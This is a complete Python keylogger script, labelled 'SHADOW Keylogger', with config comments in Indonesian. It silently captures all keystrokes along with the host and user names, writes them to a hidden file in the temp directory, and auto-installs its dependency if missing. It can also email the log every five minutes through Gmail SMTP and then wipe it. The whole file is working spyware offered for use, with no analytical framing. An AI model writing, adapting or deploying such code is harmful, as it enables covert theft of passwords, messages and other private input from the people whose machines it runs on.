#!/usr/bin/env python3
# SHADOW Keylogger — silent, email exfil optional
# pip install pynput
import os, time, socket, platform, getpass, threading
from datetime import datetime
try: from pynput import keyboard
except: os.system("pip install pynput -q"); from pynput import keyboard

# ── Config ──────────────────
LOG  = os.path.join(os.getenv("TEMP", "/tmp"), ".shdw_cache")
MAIL = False          # True = auto kirim via email
TO   = "kamu@gmail.com"
FRM  = "pengirim@gmail.com"
PWD  = "app_password_gmail"
IVTL = 300            # kirim tiap N detik
# ────────────────────────────

buf = [f"[{socket.gethostname()}][{getpass.getuser()}][{platform.system()}][{datetime.now():%Y-%m-%d %H:%M}]\n"]

SPECIALS = {
    keyboard.Key.space:     " ",
    keyboard.Key.enter:     "\n[ENT]\n",
    keyboard.Key.backspace: "[BS]",
    keyboard.Key.tab:       "[TAB]",
    keyboard.Key.delete:    "[DEL]",
    keyboard.Key.ctrl_l:    "[CTL]",
    keyboard.Key.alt_l:     "[ALT]",
    keyboard.Key.shift:     "[SHF]",
}

def on_press(key):
    try:    buf.append(key.char)
    except: buf.append(SPECIALS.get(key, f"[{key}]"))
    if len(buf) > 80: flush()

def flush():
    global buf
    with open(LOG, "a", encoding="utf-8") as f:
        f.write("".join(buf))
    buf = []

def mail_loop():
    while True:
        time.sleep(IVTL)
        flush()
        if not MAIL: continue
        try:
            import smtplib
            from email.mime.text import MIMEText
            with open(LOG, encoding="utf-8", errors="ignore") as f:
                body = f.read()
            if not body.strip(): continue
            msg = MIMEText(body)
            msg["Subject"] = f"[SHDW] {socket.gethostname()} {datetime.now():%H:%M}"
            msg["From"] = FRM; msg["To"] = TO
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as s:
                s.login(FRM, PWD); s.send_message(msg)
            open(LOG, "w").close()
        except: pass

threading.Thread(target=mail_loop, daemon=True).start()
keyboard.Listener(on_press=on_press).join()
